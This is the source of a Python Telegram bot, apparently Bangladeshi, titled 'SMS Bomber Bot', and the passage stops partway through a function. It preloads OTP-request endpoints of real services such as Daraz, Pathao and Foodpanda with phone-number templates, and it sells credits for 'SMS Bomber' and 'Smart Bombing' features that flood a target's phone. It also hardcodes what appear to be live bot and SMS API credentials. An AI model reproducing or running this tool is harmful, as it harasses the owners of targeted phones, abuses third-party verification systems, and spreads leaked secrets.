# ============================================
# SMS BOMBER BOT - COMPLETE FINAL
# ALL FEATURES WORKING - vFINAL
# ============================================

import os
import sys
import asyncio
import logging
import aiosqlite
import aiohttp
import json
import random
import re
import hashlib
from datetime import datetime, timedelta
from telegram import Update, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# ===================== কনফিগারেশন =====================
BOT_TOKEN = "7930474954:AAGlxVtZMuh04xYs7kU_dDIj0MJmZ8Q0eCI"
ADMIN_ID = 1967494059
ADMIN_USERNAME = "RobiEntertainment"

DB_PATH = "bot_database.db"

# গ্লোবাল ভেরিয়েবল
SETTINGS = {}
BOMBER_APIS = []
SMS_API_URL = ""
SMS_API_KEY = ""
BOMBING_ACTIVE = True
BOMBING_TASKS = {}
db_conn = None
DB_LOCK = asyncio.Lock()

# ========== ক্যাশিং সিস্টেম (স্পিড বুস্ট) ==========
CACHE = {}
CACHE_TIMEOUT = 300  # 5 মিনিট

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

print("=" * 60)
print("🔥 SMS BOMBER BOT - FINAL COMPLETE")
print("=" * 60)
print(f"✅ Bot Token: {'✅' if BOT_TOKEN else '❌'}")
print(f"✅ Admin ID: {ADMIN_ID}")
print("=" * 60)

# ===================== ডাটাবেস (অপটিমাইজড) =====================
async def get_db():
    global db_conn
    async with DB_LOCK:
        try:
            if db_conn is None:
                db_conn = await aiosqlite.connect(DB_PATH)
                db_conn.row_factory = aiosqlite.Row
                await db_conn.execute("PRAGMA journal_mode=WAL")
                await db_conn.execute("PRAGMA synchronous=NORMAL")
                await db_conn.execute("PRAGMA cache_size=20000")
                await db_conn.execute("PRAGMA temp_store=MEMORY")
            return db_conn
        except Exception as e:
            logger.error(f"Database error: {e}")
            db_conn = None
            raise

async def close_db():
    global db_conn
    async with DB_LOCK:
        if db_conn:
            try:
                await db_conn.close()
            except:
                pass
            db_conn = None

# ===================== ডাটাবেস ইনিশিয়ালাইজেশন =====================
async def init_db():
    try:
        conn = await get_db()
        
        await conn.execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            balance INTEGER DEFAULT 3,
            total_sms INTEGER DEFAULT 0,
            total_bombing INTEGER DEFAULT 0,
            total_bulk INTEGER DEFAULT 0,
            is_premium INTEGER DEFAULT 0,
            premium_expiry TIMESTAMP,
            last_active TIMESTAMP,
            join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            status TEXT DEFAULT 'active',
            daily_bonus_date TIMESTAMP,
            has_joined_required INTEGER DEFAULT 0,
            referral_code TEXT UNIQUE
        )''')
        
        await conn.execute('''CREATE TABLE IF NOT EXISTS transactions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            type TEXT,
            amount INTEGER,
            description TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')
        
        await conn.execute('''CREATE TABLE IF NOT EXISTS redeem_codes (
            code TEXT PRIMARY KEY,
            amount INTEGER,
            usages INTEGER,
            created_by INTEGER,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')
        
        await conn.execute('''CREATE TABLE IF NOT EXISTS redeem_history (
            user_id INTEGER,
            code TEXT,
            redeemed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            PRIMARY KEY (user_id, code)
        )''')
        
        await conn.execute('''CREATE TABLE IF NOT EXISTS apis (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT UNIQUE,
            method TEXT DEFAULT 'POST',
            url TEXT,
            body TEXT,
            is_active INTEGER DEFAULT 1,
            api_type TEXT DEFAULT 'bomber'
        )''')
        
        await conn.execute('''CREATE TABLE IF NOT EXISTS bot_settings (
            setting_key TEXT PRIMARY KEY,
            setting_value TEXT
        )''')
        
        await conn.execute('''CREATE TABLE IF NOT EXISTS admin_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            admin_id INTEGER,
            action TEXT,
            target_id INTEGER,
            details TEXT,
            log_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')

        default_settings = [
            ("daily_bonus_enabled", "true"),
            ("daily_bonus_amount", "1"),
            ("daily_bonus_cooldown", "24"),
            ("sms_cost", "1"),
            ("bomber_cost", "1"),
            ("phone_prefixes", "017,018,019,016,015,013,014,010"),
            ("phone_length", "11"),
            ("max_bomber_amount", "50"),
            ("max_bulk_numbers", "50"),
            ("bulk_sms_interval", "0.05"),
            ("premium_bonus", "10"),
            ("sms_api_url", "https://api.paglahost.shop/Custom_SMS/api.php"),
            ("sms_api_key", "Shuvo55356"),
            ("premium_price", "100"),
            ("premium_duration", "30"),
            ("required_channel", ""),
            ("required_group", ""),
            ("required_channel_link", ""),
            ("required_group_link", ""),
            ("join_required_enabled", "false"),
            ("welcome_message", "🎉 **স্বাগতম!**\n\nআমাদের বট ব্যবহার করুন।"),
            ("denied_message", "❌ **অ্যাক্সেস অস্বীকার!**\n\nএই বট ব্যবহার করতে আপনাকে অবশ্যই আমাদের গ্রুপ/চ্যানেলে জয়েন করতে হবে।"),
        ]
        
        for key, value in default_settings:
            await conn.execute("INSERT OR IGNORE INTO bot_settings (setting_key, setting_value) VALUES (?, ?)", (key, value))

        cursor = await conn.execute("SELECT COUNT(*) FROM apis")
        count = await cursor.fetchone()
        
        if count[0] == 0:
            default_apis = [
                ("Paperfly", "POST", "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", '{"phone_number":"{phone}"}'),
                ("OsudPotro", "POST", "https://api.osudpotro.com/api/v1/users/send_otp", '{"mobile":"+880{phone}"}'),
                ("Bohubrihi", "POST", "https://bb-api.bohubrihi.com/public/activity/otp", '{"phone":"{phone}"}'),
                ("Jatri", "POST", "https://user-api.jslglobal.co/v2/send-otp", '{"phone":"+88{phone}"}'),
                ("RedX", "POST", "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", '{"mobile":"+88{phone}"}'),
                ("Shikho", "POST", "https://api.shikho.com/auth/v2/send/sms", '{"phone":"{phone}"}'),
                ("Daraz", "POST", "https://member.daraz.com.bd/send-otp", '{"phone":"{phone}"}'),
                ("Foodpanda", "POST", "https://foodpanda.com.bd/api/v1/otp/send", '{"phone":"{phone}"}'),
                ("Pathao", "POST", "https://api.pathao.com/api/v1/otp/request", '{"phone":"{phone}"}'),
                ("Chaldal", "POST", "https://api.chaldal.com/api/v1/otp/send", '{"phone":"{phone}"}'),
            ]
            for api in default_apis:
                await conn.execute(
                    "INSERT INTO apis (name, method, url, body) VALUES (?, ?, ?, ?)",
                    api
                )

        await conn.commit()
        await load_settings()
        await load_apis()
        await load_sms_api()
        logger.info("✅ Database initialized")
        
    except Exception as e:
        logger.error(f"Database init error: {e}")
        raise

async def load_settings():
    global SETTINGS
    try:
        conn = await get_db()
        cursor = await conn.execute("SELECT setting_key, setting_value FROM bot_settings")
        rows = await cursor.fetchall()
        SETTINGS = {row[0]: row[1] for row in rows}
        logger.info(f"✅ Loaded {len(SETTINGS)} settings")
    except Exception as e:
        logger.error(f"Settings load error: {e}")
        SETTINGS = {}

def get_setting(key, default=None):
    cache_key = f"setting_{key}"
    if cache_key in CACHE:
        cached_value, timestamp = CACHE[cache_key]
        if (datetime.now() - timestamp).total_seconds() < CACHE_TIMEOUT:
            return cached_value
    
    value = SETTINGS.get(key, default)
    CACHE[cache_key] = (value, datetime.now())
    return value

async def update_setting(key, value):
    global SETTINGS
    try:
        conn = await get_db()
        await conn.execute(
            "INSERT OR REPLACE INTO bot_settings (setting_key, setting_value) VALUES (?, ?)",
            (key, value)
        )
        await conn.commit()
        SETTINGS[key] = value
        CACHE[f"setting_{key}"] = (value, datetime.now())
        return True
    except Exception as e:
        logger.error(f"Update setting error: {e}")
        return False

async def load_sms_api():
    global SMS_API_URL, SMS_API_KEY
    SMS_API_URL = get_setting('sms_api_url', 'https://api.paglahost.shop/Custom_SMS/api.php')
    SMS_API_KEY = get_setting('sms_api_key', 'Shuvo55356')

async def load_apis():
    global BOMBER_APIS
    try:
        conn = await get_db()
        cursor = await conn.execute("SELECT name, method, url, body FROM apis WHERE is_active = 1")
        rows = await cursor.fetchall()
        BOMBER_APIS = []
        for row in rows:
            try:
                body = json.loads(row[3]) if row[3] else {}
            except:
                body = {}
            BOMBER_APIS.append({
                "name": row[0],
                "method": row[1],
                "url": row[2],
                "body": body
            })
        logger.info(f"✅ Loaded {len(BOMBER_APIS)} APIs")
    except Exception as e:
        logger.error(f"API load error: {e}")
        BOMBER_APIS = []

# ===================== হেল্পার =====================
async def safe_api_call(url, method='POST', data=None, params=None, timeout=10):
    try:
        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
        async with aiohttp.ClientSession() as session:
            if method.upper() == 'POST':
                async with session.post(url, json=data, headers=headers, timeout=timeout) as resp:
                    return True, await resp.text(), resp.status
            else:
                async with session.get(url, params=params, headers=headers, timeout=timeout) as resp:
                    return True, await resp.text(), resp.status
    except Exception as e:
        return False, str(e), 500

def replace_phone(data, phone):
    if isinstance(data, dict):
        return {k: replace_phone(v, phone) for k, v in data.items()}
    elif isinstance(data, list):
        return [replace_phone(item, phone) for item in data]
    elif isinstance(data, str):
        return data.replace('{phone}', str(phone))
    return data

def check_success(text, status):
    keywords = ['success', 'otp', 'sent', 'ok', 'true', '1', 'done']
    if status in [200, 201, 202, 204]:
        return any(word in text.lower() for word in keywords)
    return False

def validate_phone(phone):
    if not phone or not phone.isdigit():
        return False, "শুধু সংখ্যা দিন!"
    if len(phone) != 11:
        return False, "১১ ডিজিটের নম্বর দিন!"
    prefixes = get_setting('phone_prefixes', '017,018,019,016,015,013,014,010').split(',')
    if prefixes != ['*'] and phone[:3] not in prefixes:
        return False, f"ভ্যালিড প্রিফিক্স নয়! ({', '.join(prefixes)})"
    return True, "✅ ভ্যালিড"

def progress_bar(current, total, length=15):
    if total <= 0:
        return "⬜" * length + " 0%"
    current = min(current, total)
    filled = int(length * current / total)
    return '🟩' * filled + '⬜' * (length - filled) + f" {round(current/total*100, 1)}%"

def generate_referral_code(user_id):
    return hashlib.md5(str(user_id).encode()).hexdigest()[:6].upper()

def is_premium_expired(expiry_date):
    if not expiry_date:
        return True
    try:
        return datetime.now() > datetime.fromisoformat(expiry_date)
    except:
        return True

async def send_sms_api(phone, message):
    if not SMS_API_URL or not SMS_API_KEY:
        return False, "SMS API কনফিগার করা নেই!"
    try:
        params = {"key": SMS_API_KEY, "number": phone, "msg": message}
        success, text, status = await safe_api_call(SMS_API_URL, method='GET', params=params)
        if not success:
            return False, f"API Error: {text}"
        success_keywords = ['success', 'sent', 'ok', 'true', '1', 'done']
        if any(word in text.lower() for word in success_keywords):
            return True, "সফল"
        return False, f"API রেসপন্স: {text[:100]}"
    except Exception as e:
        return False, str(e)

async def track_transaction(user_id, trans_type, amount, description=""):
    try:
        conn = await get_db()
        await conn.execute(
            "INSERT INTO transactions (user_id, type, amount, description) VALUES (?, ?, ?, ?)",
            (user_id, trans_type, amount, description)
        )
        await conn.commit()
    except:
        pass

async def admin_log(admin_id, action, target_id=None, details=""):
    try:
        conn = await get_db()
        await conn.execute(
            "INSERT INTO admin_logs (admin_id, action, target_id, details) VALUES (?, ?, ?, ?)",
            (admin_id, action, target_id, details)
        )
        await conn.commit()
    except:
        pass

# ===================== অ্যাক্সেস চেক =====================
async def check_user_access(user_id):
    if user_id == ADMIN_ID:
        return True, ""
    
    if get_setting('join_required_enabled', 'false') != 'true':
        return True, ""
    
    conn = await get_db()
    cursor = await conn.execute("SELECT has_joined_required FROM users WHERE user_id = ?", (user_id,))
    row = await cursor.fetchone()
    
    if row and row[0] == 1:
        return True, ""
    
    channel = get_setting('required_channel', '')
    group = get_setting('required_group', '')
    
    if not channel and not group:
        return True, ""
    
    channel_link = get_setting('required_channel_link', '')
    group_link = get_setting('required_group_link', '')
    
    msg = get_setting('denied_message', '❌ **অ্যাক্সেস অস্বীকার!**')
    
    keyboard = []
    if channel_link:
        keyboard.append([InlineKeyboardButton("📢 চ্যানেল জয়েন", url=channel_link)])
    if group_link:
        keyboard.append([InlineKeyboardButton("👥 গ্রুপ জয়েন", url=group_link)])
    keyboard.append([InlineKeyboardButton("✅ চেক করুন", callback_data="check_access")])
    
    return False, (msg, InlineKeyboardMarkup(keyboard))

async def check_access_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    
    conn = await get_db()
    await conn.execute("UPDATE users SET has_joined_required = 1 WHERE user_id = ?", (user_id,))
    await conn.commit()
    
    await query.edit_message_text(
        "✅ **জয়েন ভেরিফাইড!**\n\nআপনি এখন বট ব্যবহার করতে পারবেন।\n/start দিন।",
        parse_mode="Markdown"
    )

# ============================================================
# 📋 কীবোর্ড
# ============================================================

def get_main_keyboard():
    return ReplyKeyboardMarkup([
        [{"text": "📨 Send SMS", "style": "primary"}, {"text": "💣 SMS Bomber", "style": "danger"}],
        [{"text": "📤 Bulk SMS", "style": "primary"}, {"text": "👤 My Profile", "style": "success"}],
        [{"text": "🎁 Redeem Code", "style": "success"}, {"text": "📞 Support", "style": "primary"}],
        [{"text": "⭐ Daily Bonus", "style": "success"}, {"text": "🏆 Leaderboard", "style": "primary"}],
        [{"text": "👑 Premium", "style": "primary"}, {"text": "🎯 Smart Bombing", "style": "danger"}],
        [{"text": "🔮 Utilities", "style": "primary"}],
    ], resize_keyboard=True)

def get_admin_keyboard():
    return ReplyKeyboardMarkup([
        [{"text": "👥 User Control", "style": "primary"}, {"text": "📢 Group Control", "style": "primary"}],
        [{"text": "💰 Balance Control", "style": "primary"}, {"text": "🎟️ Redeem Control", "style": "success"}],
        [{"text": "📡 API Manager", "style": "primary"}, {"text": "🎁 Bonus Control", "style": "success"}],
        [{"text": "📈 Reports", "style": "primary"}, {"text": "🔧 Settings", "style": "primary"}],
        [{"text": "📣 Broadcast", "style": "success"}, {"text": "💣 Bomber", "style": "danger"}],
        [{"text": "⛔ Stop Bombing", "style": "danger"}, {"text": "✅ Start Bombing", "style": "success"}],
        [{"text": "🔄 Restart Bot", "style": "danger"}, {"text": "🔙 Exit Admin", "style": "primary"}]
    ], resize_keyboard=True)

def get_user_control_keyboard():
    return ReplyKeyboardMarkup([
        [{"text": "🚫 Block User", "style": "danger"}, {"text": "✅ Unblock User", "style": "success"}],
        [{"text": "ℹ️ User Info", "style": "primary"}, {"text": "📋 List Users", "style": "primary"}],
        [{"text": "👑 Make Premium", "style": "success"}, {"text": "❌ Remove Premium", "style": "danger"}],
        [{"text": "🗑️ Delete User", "style": "danger"}, {"text": "🔙 Back", "style": "primary"}]
    ], resize_keyboard=True)

def get_group_control_keyboard():
    return ReplyKeyboardMarkup([
        [{"text": "📢 Set Channel", "style": "primary"}, {"text": "👥 Set Group", "style": "primary"}],
        [{"text": "🔗 Set Channel Link", "style": "primary"}, {"text": "🔗 Set Group Link", "style": "primary"}],
        [{"text": "✏️ Set Welcome", "style": "primary"}, {"text": "🚫 Set Denied", "style": "danger"}],
        [{"text": "✅ Enable Join", "style": "success"}, {"text": "❌ Disable Join", "style": "danger"}],
        [{"text": "📊 View Settings", "style": "primary"}, {"text": "🔙 Back", "style": "primary"}]
    ], resize_keyboard=True)

def get_balance_keyboard():
    return ReplyKeyboardMarkup([
        [{"text": "🟢 Add Credit", "style": "success"}, {"text": "🔴 Remove Credit", "style": "danger"}],
        [{"text": "🎁 Gift All", "style": "success"}, {"text": "🎁 Gift User", "style": "success"}],
        [{"text": "📝 Set Balance", "style": "primary"}, {"text": "🔄 Reset All", "style": "danger"}],
        [{"text": "📊 Report", "style": "primary"}, {"text": "🔙 Back", "style": "primary"}]
    ], resize_keyboard=True)

def get_redeem_keyboard():
    return ReplyKeyboardMarkup([
        [{"text": "➕ Create Code", "style": "success"}, {"text": "❌ Delete Code", "style": "danger"}],
        [{"text": "🗑️ Delete All", "style": "danger"}, {"text": "✏️ Edit Code", "style": "primary"}],
        [{"text": "📋 List Codes", "style": "primary"}, {"text": "🔙 Back", "style": "primary"}]
    ], resize_keyboard=True)

def get_api_keyboard():
    return ReplyKeyboardMarkup([
        [{"text": "➕ Add API", "style": "success"}, {"text": "✏️ Edit API", "style": "primary"}],
        [{"text": "🗑️ Delete API", "style": "danger"}, {"text": "🔄 Toggle API", "style": "primary"}],
        [{"text": "📋 View APIs", "style": "primary"}, {"text": "🔙 Back", "style": "primary"}]
    ], resize_keyboard=True)

def get_utilities_keyboard():
    return ReplyKeyboardMarkup([
        [{"text": "🌐 IP Info", "style": "primary"}],
        [{"text": "📮 ZIP Code", "style": "primary"}],
        [{"text": "🎬 Movie", "style": "primary"}],
        [{"text": "🔙 Back", "style": "primary"}]
    ], resize_keyboard=True)

def get_back_keyboard():
    return ReplyKeyboardMarkup([[{"text": "🔙 Back", "style": "primary"}]], resize_keyboard=True)

# ============================================================
# 🎯 ইউটিলিটি ফাংশন
# ============================================================

async def get_ip_info():
    try:
        success, text, _ = await safe_api_call("https://ipinfo.io/json", method='GET')
        if success:
            data = json.loads(text)
            return f"📍 **IP তথ্য**\n\n🌐 IP: `{data.get('ip', 'N/A')}`\n📍 লোকেশন: {data.get('city', 'N/A')}, {data.get('region', 'N/A')}\n🌍 দেশ: {data.get('country', 'N/A')}"
        return "❌ IP তথ্য পাওয়া যায়নি!"
    except:
        return "❌ ত্রুটি!"

async def get_zip_info(country, zip_code):
    try:
        success, text, _ = await safe_api_call(f"https://api.zippopotam.us/{country}/{zip_code}", method='GET')
        if success:
            data = json.loads(text)
            places = data.get('places', [])
            if places:
                place = places[0]
                return f"📮 **ZIP কোড**\n\n📍 লোকেশন: {place.get('place name', 'N/A')}\n🌍 রাজ্য: {place.get('state', 'N/A')}\n📮 ZIP: {data.get('post code', 'N/A')}"
        return "❌ ZIP কোড তথ্য পাওয়া যায়নি!"
    except:
        return "❌ ত্রুটি!"

async def get_movie_info(title):
    try:
        success, text, _ = await safe_api_call(f"http://www.omdbapi.com/?t={title}&apikey=9f5a7d8e", method='GET')
        if success:
            data = json.loads(text)
            if data.get('Response') == 'True':
                return f"🎬 **মুভি**\n\n📽️ টাইটেল: {data.get('Title', 'N/A')}\n📅 বছর: {data.get('Year', 'N/A')}\n⭐ রেটিং: {data.get('imdbRating', 'N/A')}/10"
        return f"❌ '{title}' মুভি পাওয়া যায়নি!"
    except:
        return "❌ ত্রুটি!"

# ============================================================
# 🚀 স্টার্ট
# ============================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    conn = await get_db()
    await conn.execute(
        "INSERT OR IGNORE INTO users (user_id, username, first_name) VALUES (?, ?, ?)",
        (user_id, user.username or "", user.first_name or "")
    )
    await conn.execute(
        "UPDATE users SET last_active = CURRENT_TIMESTAMP WHERE user_id = ?",
        (user_id,)
    )
    await conn.execute(
        "UPDATE users SET referral_code = ? WHERE user_id = ? AND referral_code IS NULL",
        (generate_referral_code(user_id), user_id)
    )
    await conn.commit()
    
    has_access, access_data = await check_user_access(user_id)
    
    if not has_access:
        msg, keyboard = access_data
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=keyboard)
        return
    
    if user_id == ADMIN_ID:
        await update.message.reply_text(
            "🛡️ **অ্যাডমিন প্যানেল**\n\nস্বাগতম!",
            parse_mode="Markdown",
            reply_markup=get_admin_keyboard()
        )
        return
    
    welcome_msg = get_setting('welcome_message', '🎉 **স্বাগতম!**\n\nআমাদের বট ব্যবহার করুন।')
    welcome_msg = welcome_msg.replace('{user}', user.first_name or '')
    
    await update.message.reply_text(
        f"{welcome_msg}\n\n📌 **একটি অপশন নির্বাচন করুন:**",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )

# ============================================================
# 👑 প্রিমিয়াম কেনা
# ============================================================

async def buy_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    conn = await get_db()
    cursor = await conn.execute("SELECT is_premium, premium_expiry, balance FROM users WHERE user_id = ?", (user_id,))
    row = await cursor.fetchone()
    
    if not row:
        await update.message.reply_text("❌ ইউজার পাওয়া যায়নি!", reply_markup=get_main_keyboard())
        return
    
    if row[0] == 1 and not is_premium_expired(row[1]):
        await update.message.reply_text("✅ আপনি ইতিমধ্যে প্রিমিয়াম!", reply_markup=get_main_keyboard())
        return
    
    if row[0] == 1 and is_premium_expired(row[1]):
        await conn.execute("UPDATE users SET is_premium = 0, premium_expiry = NULL WHERE user_id = ?", (user_id,))
        row = (0, None, row[2])
    
    price = int(get_setting('premium_price', '100'))
    duration = int(get_setting('premium_duration', '30'))
    
    if row[2] < price:
        await update.message.reply_text(
            f"❌ পর্যাপ্ত ক্রেডিট নেই!\n\n💰 প্রয়োজন: {price}\n💰 আপনার: {row[2]}",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        return
    
    expiry = (datetime.now() + timedelta(days=duration)).isoformat()
    await conn.execute(
        "UPDATE users SET is_premium = 1, premium_expiry = ?, balance = balance - ? WHERE user_id = ?",
        (expiry, price, user_id)
    )
    await conn.commit()
    await track_transaction(user_id, "spend", -price, f"Bought premium ({duration} days)")
    
    await update.message.reply_text(
        f"🎉 **প্রিমিয়াম সক্রিয়!**\n\n📅 সময়কাল: {duration} দিন",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )

# ============================================================
# 📝 মেইন হ্যান্ডলার
# ============================================================

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global BOMBING_ACTIVE, BOMBING_TASKS
    
    user_id = update.effective_user.id
    message = update.message.text
    state = context.user_data.get('state')
    admin_state = context.user_data.get('admin_state')
    
    # ===== ব্যাক বাটন =====
    if message == "🔙 Back":
        context.user_data.clear()
        if user_id == ADMIN_ID:
            await update.message.reply_text("🛡️ **অ্যাডমিন**", parse_mode="Markdown", reply_markup=get_admin_keyboard())
        else:
            await update.message.reply_text("🏠 **মেইন**", parse_mode="Markdown", reply_markup=get_main_keyboard())
        return
    
    # ============================================================
    # 🛡️ অ্যাডমিন মেনু
    # ============================================================
    if user_id == ADMIN_ID:
        if message == "👥 User Control":
            await update.message.reply_text("👥 **ইউজার কন্ট্রোল**", parse_mode="Markdown", reply_markup=get_user_control_keyboard())
            return
        if message == "📢 Group Control":
            await update.message.reply_text("📢 **গ্রুপ কন্ট্রোল**", parse_mode="Markdown", reply_markup=get_group_control_keyboard())
            return
        if message == "💰 Balance Control":
            await update.message.reply_text("💰 **ব্যালেন্স কন্ট্রোল**", parse_mode="Markdown", reply_markup=get_balance_keyboard())
            return
        if message == "🎟️ Redeem Control":
            await update.message.reply_text("🎟️ **রিডিম কন্ট্রোল**", parse_mode="Markdown", reply_markup=get_redeem_keyboard())
            return
        if message == "📡 API Manager":
            await update.message.reply_text("📡 **API ম্যানেজার**", parse_mode="Markdown", reply_markup=get_api_keyboard())
            return
        if message == "🎁 Bonus Control":
            await update.message.reply_text(
                "🎁 **বোনাস কন্ট্রোল**\n\nকমান্ড দিন:\n`DAILY ON` - চালু\n`DAILY OFF` - বন্ধ\n`DAILY AMOUNT 10` - বোনাস পরিবর্তন\n`DAILY COOLDOWN 12` - কুলডাউন",
                parse_mode="Markdown"
            )
            context.user_data['admin_state'] = 'bonus_control'
            return
        if message == "📈 Reports":
            conn = await get_db()
            cursor = await conn.execute("SELECT COUNT(*) FROM users")
            total = await cursor.fetchone()
            cursor = await conn.execute("SELECT COUNT(*) FROM users WHERE status = 'active'")
            active = await cursor.fetchone()
            cursor = await conn.execute("SELECT COUNT(*) FROM users WHERE is_premium = 1")
            premium = await cursor.fetchone()
            cursor = await conn.execute("SELECT COUNT(*) FROM transactions")
            trans = await cursor.fetchone()
            await update.message.reply_text(
                f"📊 **রিপোর্ট**\n━━━━━━━━━━━━━━━━━━━\n\n"
                f"👥 মোট ইউজার: `{total[0]}`\n"
                f"✅ অ্যাক্টিভ: `{active[0]}`\n"
                f"👑 প্রিমিয়াম: `{premium[0]}`\n"
                f"📝 ট্রানজেকশন: `{trans[0]}`",
                parse_mode="Markdown",
                reply_markup=get_admin_keyboard()
            )
            return
        if message == "🔧 Settings":
            daily_enabled = get_setting('daily_bonus_enabled', 'true')
            daily_amount = get_setting('daily_bonus_amount', '5')
            sms_cost = get_setting('sms_cost', '1')
            bomber_cost = get_setting('bomber_cost', '1')
            await update.message.reply_text(
                f"🔧 **সেটিংস**\n━━━━━━━━━━━━━━━━━━━\n\n"
                f"⭐ ডেইলি বোনাস: {'✅' if daily_enabled == 'true' else '❌'}\n"
                f"💰 বোনাস: `{daily_amount}`\n"
                f"📨 SMS খরচ: `{sms_cost}`\n"
                f"💣 বোম্বার খরচ: `{bomber_cost}`",
                parse_mode="Markdown",
                reply_markup=get_admin_keyboard()
            )
            return
        if message == "📣 Broadcast":
            await update.message.reply_text("📣 **Broadcast**\n\nমেসেজ দিন:", parse_mode="Markdown")
            context.user_data['admin_state'] = 'broadcast'
            return
        if message == "💣 Bomber":
            await update.message.reply_text("💣 **Bomber**\n\nটার্গেট নম্বর দিন:", parse_mode="Markdown")
            context.user_data['state'] = 'bomber_number'
            return
        if message == "⛔ Stop Bombing":
            BOMBING_ACTIVE = False
            for uid in list(BOMBING_TASKS.keys()):
                if uid in BOMBING_TASKS:
                    BOMBING_TASKS[uid]['active'] = False
                    await asyncio.sleep(0.5)
                    if uid in BOMBING_TASKS:
                        del BOMBING_TASKS[uid]
            await update.message.reply_text("⛔ **বোম্বিং বন্ধ!**", parse_mode="Markdown", reply_markup=get_admin_keyboard())
            return
        if message == "✅ Start Bombing":
            BOMBING_ACTIVE = True
            await update.message.reply_text("✅ **বোম্বিং চালু!**", parse_mode="Markdown", reply_markup=get_admin_keyboard())
            return
        if message == "🔄 Restart Bot":
            await update.message.reply_text("🔄 **রিস্টার্ট হচ্ছে...**", parse_mode="Markdown")
            await asyncio.sleep(2)
            os.execv(sys.executable, [sys.executable] + sys.argv)
            return
        if message == "🔙 Exit Admin":
            await update.message.reply_text("👤 **ইউজার মোড**", parse_mode="Markdown", reply_markup=get_main_keyboard())
            return
    
    # ============================================================
    # 👥 ইউজার কন্ট্রোল
    # ============================================================
    if message == "🚫 Block User":
        await update.message.reply_text("🚫 **Block User**\n\nইউজার আইডি দিন:", parse_mode="Markdown")
        context.user_data['admin_state'] = 'block_user'
        return
    if message == "✅ Unblock User":
        await update.message.reply_text("✅ **Unblock User**\n\nইউজার আইডি দিন:", parse_mode="Markdown")
        context.user_data['admin_state'] = 'unblock_user'
        return
    if message == "ℹ️ User Info":
        await update.message.reply_text("ℹ️ **User Info**\n\nইউজার আইডি দিন:", parse_mode="Markdown")
        context.user_data['admin_state'] = 'user_info'
        return
    if message == "📋 List Users":
        conn = await get_db()
        cursor = await conn.execute("SELECT user_id, username, first_name, balance, status, is_premium FROM users ORDER BY user_id DESC LIMIT 20")
        users = await cursor.fetchall()
        if users:
            response = "📋 **ইউজার লিস্ট**\n━━━━━━━━━━━━━━━━━━━\n\n"
            for i, user in enumerate(users, 1):
                status = "🟢" if user[4] == 'active' else "🔴"
                premium = "👑" if user[5] == 1 else ""
                name = user[2] or user[1] or f"User{user[0]}"
                response += f"{i}. {status} `{user[0]}` - {name} - 💰{user[3]} {premium}\n"
            await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_user_control_keyboard())
        else:
            await update.message.reply_text("👥 কোনো ইউজার নেই!", reply_markup=get_user_control_keyboard())
        return
    if message == "👑 Make Premium":
        await update.message.reply_text("👑 **Make Premium**\n\nইউজার আইডি দিন:", parse_mode="Markdown")
        context.user_data['admin_state'] = 'make_premium'
        return
    if message == "❌ Remove Premium":
        await update.message.reply_text("❌ **Remove Premium**\n\nইউজার আইডি দিন:", parse_mode="Markdown")
        context.user_data['admin_state'] = 'remove_premium'
        return
    if message == "🗑️ Delete User":
        await update.message.reply_text("🗑️ **Delete User**\n\nইউজার আইডি দিন:", parse_mode="Markdown")
        context.user_data['admin_state'] = 'delete_user'
        return
    
    # ============================================================
    # 👥 ইউজার কন্ট্রোল এক্সিকিউট
    # ============================================================
    if admin_state == 'block_user':
        try:
            target_id = int(message.strip())
            conn = await get_db()
            await conn.execute("UPDATE users SET status = 'banned' WHERE user_id = ?", (target_id,))
            await conn.commit()
            await admin_log(user_id, "Blocked User", target_id, f"User {target_id} blocked")
            await update.message.reply_text(f"🚫 ইউজার `{target_id}` ব্লক!", parse_mode="Markdown", reply_markup=get_user_control_keyboard())
        except:
            await update.message.reply_text("❌ ভুল আইডি! সংখ্যা দিন।", parse_mode="Markdown", reply_markup=get_user_control_keyboard())
        context.user_data['admin_state'] = None
        return
    
    if admin_state == 'unblock_user':
        try:
            target_id = int(message.strip())
            conn = await get_db()
            await conn.execute("UPDATE users SET status = 'active' WHERE user_id = ?", (target_id,))
            await conn.commit()
            await admin_log(user_id, "Unblocked User", target_id, f"User {target_id} unblocked")
            await update.message.reply_text(f"✅ ইউজার `{target_id}` আনব্লক!", parse_mode="Markdown", reply_markup=get_user_control_keyboard())
        except:
            await update.message.reply_text("❌ ভুল আইডি! সংখ্যা দিন।", parse_mode="Markdown", reply_markup=get_user_control_keyboard())
        context.user_data['admin_state'] = None
        return
    
    if admin_state == 'user_info':
        try:
            target_id = int(message.strip())
            conn = await get_db()
            cursor = await conn.execute(
                "SELECT username, first_name, balance, status, is_premium, total_sms, total_bombing, total_bulk, join_date FROM users WHERE user_id = ?",
                (target_id,)
            )
            row = await cursor.fetchone()
            if row:
                is_prem = row[4] == 1
                await update.message.reply_text(
